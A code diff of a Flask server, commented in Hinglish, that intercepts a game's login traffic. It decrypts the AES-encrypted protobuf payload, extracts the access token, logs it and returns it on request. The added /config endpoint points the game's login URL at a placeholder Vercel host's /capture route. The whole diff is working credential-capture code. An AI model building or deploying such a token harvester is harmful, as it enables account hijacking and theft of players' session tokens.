@@ -1,5 +1,6 @@
 from flask import Flask, request, jsonify
 import time
+import httpx
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import blackboxprotobuf
@@ -23,17 +24,23 @@ def home():
 def capture():
     global tokens
     
+    # GET request — token check karne ke liye
     if request.method == 'GET':
         data = tokens.get('latest')
         if data:
-            return jsonify(data)
-        return jsonify({"error": "No token captured yet"}), 404
+            return jsonify({
+                "access_token": data.get('access_token'),
+                "timestamp": data.get('timestamp'),
+                "status": "captured"
+            })
+        return jsonify({"error": "No token captured yet", "status": "waiting"}), 404
     
     # POST request — game se data aayega
     raw = request.get_data()
     print(f"[*] Received {len(raw)} bytes")
     
     try:
+        # AES decrypt + Protobuf parse (RishuAccessToken.py wala logic)
         dec = decrypt_data(raw)
         decoded, _ = blackboxprotobuf.decode_message(dec)
         
@@ -47,12 +54,24 @@ def capture():
                     'access_token': token,
                     'timestamp': time.time()
                 }
-                print(f"[+] Token: {token}")
-                return jsonify({"status": "success", "message": "Token captured"})
+                print(f"[+] TOKEN CAPTURED: {token}")
+                print(f"[+] Timestamp: {time.ctime()}")
+                
+                return jsonify({
+                    "status": "success",
+                    "message": "Token captured successfully",
+                    "access_token": token
+                })
     except Exception as e:
         print(f"[-] Error: {e}")
     
     return jsonify({"status": "error", "message": "Failed to capture"}), 400
+
+@app.route('/config', methods=['GET'])
+def config():
+    return jsonify({
+        "serverLoginUrl": "https://your-project.vercel.app/capture"
+    })
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=3000)
